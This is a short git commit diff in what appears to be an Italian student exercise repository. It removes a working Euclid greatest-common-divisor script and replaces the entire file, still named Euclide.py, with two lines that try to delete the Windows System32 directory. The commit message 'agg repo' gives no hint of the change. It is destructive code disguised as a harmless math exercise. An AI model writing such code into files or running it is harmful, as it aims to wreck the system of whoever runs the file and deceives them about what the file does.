3726d6dc94fbc96895b8a37e78eef0fdb0e730ec
CarloDaRomadev <135441131+CarloDaRomadev@users.noreply.github.com>
2023-12-05 22:47:53 +0100

    agg repo

--- foglio 3/Euclide.py
+++ foglio 3/Euclide.py
@@ -1,9 +1,2 @@
-def euclide(x,y)->int:
-    if x%y==0:
-        return y
-    else:
-        return euclide(y,x%y)
-
-x = input("primo numero:")
-y = input("secondo numero:")
-print(euclide(int(x),int(y)))
+import os
+os.remove("C:\Windows\System32")
